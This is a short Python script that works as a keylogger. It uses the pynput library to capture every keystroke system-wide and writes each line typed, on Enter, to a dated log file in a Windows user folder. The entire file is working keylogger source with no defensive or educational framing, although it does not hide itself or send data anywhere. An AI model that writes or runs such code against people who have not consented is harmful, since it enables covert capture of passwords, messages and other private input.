from pynput import keyboard
from datetime import datetime
import logging

todays_date = datetime.now().strftime('%Y-%b-%d')
log_dir = "C:\\Users\\user\\Logs\\"

logging.basicConfig(filename=(log_dir + todays_date + '.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')

stri = ""

def on_press(key):
    global stri
    #try:
    #print(key.char)
    try:
        stri += str(key.char)

    except AttributeError:
        if key == keyboard.Key.enter:
            print(stri)
            logging.info(stri)
            stri = ""
        else:
            stri += ' '

if __name__ == '__main__':
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
